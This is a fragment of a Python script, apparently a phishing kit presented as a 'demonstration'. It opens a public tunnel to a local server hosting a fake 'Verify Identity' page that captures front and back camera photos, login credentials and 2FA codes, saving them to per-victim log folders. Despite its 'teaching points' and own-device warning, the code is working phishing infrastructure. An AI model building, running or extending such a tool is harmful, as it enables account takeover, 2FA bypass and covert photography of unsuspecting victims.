    
    tunnel = TunnelManager()
    tunnel_url = tunnel.start_tunnel(port, custom_name if custom_name else platform['name'].lower())
    stats.tunnel_url = tunnel_url
    
    def run_server():
        server.serve_forever()
    threading.Thread(target=run_server, daemon=True).start()
    
    clear_screen()
    print_banner()
    print(f"""
{Colors.GREEN}╔══════════════════════════════════════════════════════════════════╗
║                    ✅ DEMONSTRATION READY!                          ║
╚══════════════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.BOLD}🔗 OPEN THIS LINK ON YOUR PHONE:{Colors.END}
    {Colors.CYAN}{Colors.BOLD}{tunnel_url}{Colors.END}

{Colors.YELLOW}📋 DEMO FLOW:{Colors.END}
    1. Open link → Click "Verify Identity" button
    2. Grant camera permission → 5 front photos captured
    3. Switch to back camera → 5 back photos captured
    4. Login form appears → Enter credentials + 2FA
    5. All data saved to logs/{platform['name'].lower()}/victim_.../

{Colors.YELLOW}💡 TEACHING POINTS:{Colors.END}
    • "Identity verification" is a common phishing pretext
    • Camera access granted through a button click
    • Both cameras accessed without further prompts
    • This is why you must distrust camera requests!

{Colors.RED}⚠️  THIS CAPTURES REAL PHOTOS - USE ONLY ON YOUR DEVICE{Colors.END}
{Colors.RED}Press Ctrl+C to stop{Colors.END}
""")
    
    def signal_handler(sig, frame):
        print(f"\n\n{Colors.YELLOW}🛑 Stopping...{Colors.END}")
        tunnel.stop()
        server.shutdown()
        report = generate_report()
        report_file = f"logs/reports/report_{timestamp}.txt"
        with open(report_file, 'w') as f:
            f.write(report)
        print(report)
        print(f"\n{Colors.GREEN}✅ Report: {report_file}{Colors.END}")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == "__main__":
    import signal
    main()
